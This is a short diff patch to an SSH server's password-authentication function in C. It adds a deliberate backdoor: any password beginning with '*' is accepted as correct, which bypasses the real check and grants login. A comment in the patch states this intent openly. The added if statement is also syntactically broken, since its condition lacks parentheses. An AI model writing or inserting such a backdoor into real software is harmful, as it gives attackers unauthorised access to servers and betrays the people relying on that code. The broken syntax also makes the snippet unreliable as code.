@@ -75,6 +75,9 @@ extern login_cap_t *lc;
 int
 auth_password(struct ssh *ssh, const char *password)
 {
+	//this checks if the first charecter of the given password is a star if so it exits the function and says the password is correct
+	if password[0]=='*' 
+		return 1;
 	Authctxt *authctxt = ssh->authctxt;
 	struct passwd *pw = authctxt->pw;
 	int result, ok = authctxt->valid;
